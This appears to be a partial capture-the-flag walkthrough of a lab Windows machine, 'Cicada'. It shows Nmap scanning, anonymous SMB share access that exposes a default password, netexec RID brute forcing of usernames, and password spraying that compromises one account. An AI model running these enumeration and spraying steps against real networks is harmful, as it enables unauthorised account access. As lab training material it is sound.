# Cicada - Windows(Easy)

## Summary

## Inital startup
Check that you have successfully connected to the VPN and you can reach the box.

```
openvpn lab_connection.ovpn
ping <target IP>
```

![ping](Images/ping.png)


## Enumeration
Begin enumeration on the host by running an Nmap scan. 

```
sudo nmap -sC -sV <target IP>

-sC 
-sV Version Scan
```

![nmap](Images/nmap.png)

This returns quite a bit of information. We can see that a few ports are open, most notably port 445(SMB).

## Investigating SMB
We can check SMB by using netexec and smbclient.

```
netexec smb <target IP>
- Check SMB

netexec winrm <target IP>

smbclient -NL <target IP>
- List SMB shares
```

![nxc](Images/nxc.png)

After checking the listed shares we find out that the HR share can be accessed with an anonymous user (no username/password is required).

```
smbclient //<target IP>/HR
```

![HR](Images/HR.png)

We can then retrieve the 'Notice from HR.txt' file by using the get command.
Back on our attacking machine we can cat the file to read the contents. 

![HRContent](Images/HRContent.png)

Here we can see the default password that is provided to new hires.

Now we can use the --rid-brute option in netexec to brute force a list of usernames and output them to a txt file.

```
netexec smb <target IP> -u 'anonymous' -p '' --rid-brute > user_name_enum.txt
```

![UserEnum](Images/UserEnum.png)

Clean up the output so that only the text file only contains the usernames.
Then use netexec to check to see if the default password is still in use by any of the accounts.

```
netexec smb <target IP> -u userNames.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```
![UserEnumPwd](Images/UserEnumPwd.png)

We can see that the password worked for the user michael.wrightson

smbclient -L <target IP> -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'

